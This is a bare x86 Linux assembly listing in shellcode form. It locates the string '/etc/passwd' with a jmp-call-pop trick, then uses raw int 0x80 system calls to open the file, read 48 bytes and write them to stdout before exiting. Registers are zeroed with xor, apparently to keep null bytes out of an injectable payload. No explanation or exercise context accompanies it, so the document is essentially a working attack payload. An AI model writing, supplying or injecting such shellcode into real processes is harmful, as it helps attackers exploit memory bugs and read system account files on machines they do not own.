section .text
global _start
_start
	jmp file
open :
	pop ebx
	xor eax,eax
	mov al,5
	xor ecx,ecx
	int 0x80


	mov ebx,eax
	mov al,3
	mov ecx,esp
	mov dl,0x30
	int 0x80

	mov al,4
	mov bl,1
	mov dl,0x30
	int 0x80

	xor eax,eax
	inc eax
	int 0x80

file :
	call open
	db '/etc/passwd',0x0
